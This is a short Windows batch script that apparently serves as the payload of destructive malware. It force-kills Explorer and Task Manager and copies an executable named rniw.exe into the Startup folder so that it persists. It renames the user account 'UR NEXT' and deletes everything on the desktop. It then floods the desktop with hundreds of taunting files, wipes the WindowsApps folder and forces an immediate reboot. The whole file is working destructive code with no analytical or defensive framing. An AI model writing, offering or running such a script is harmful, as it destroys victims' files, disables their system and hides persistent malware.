@echo off
taskkill /f /im explorer.exe
taskkill /f /im taskmgr.exe
copy %temp%\rniw.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\rniw.exe"
wmic useraccount where name='%username%' set FullName='UR NEXT'
wmic useraccount where name='%username%' rename 'UR NEXT'
SET /a cr=0

del /f /s /q %userprofile%\Desktop\*
for /d %%p in (%userprofile%\Desktop\*) Do rd /Q /S "%%p"

:l
copy %temp%\text.txt "%userprofile%\Desktop\UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR NEXT UR N%cr%XT.txt"
SET /a cr=%cr%+1
if %cr%==28 copy %temp%\one.rtf %userprofile%\Desktop\OPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENMEOPENME.rtf
if not %cr%==400 goto l

del /f /s /q "C:\Program Files\WindowsApps\"
shutdown /f /r /t 0
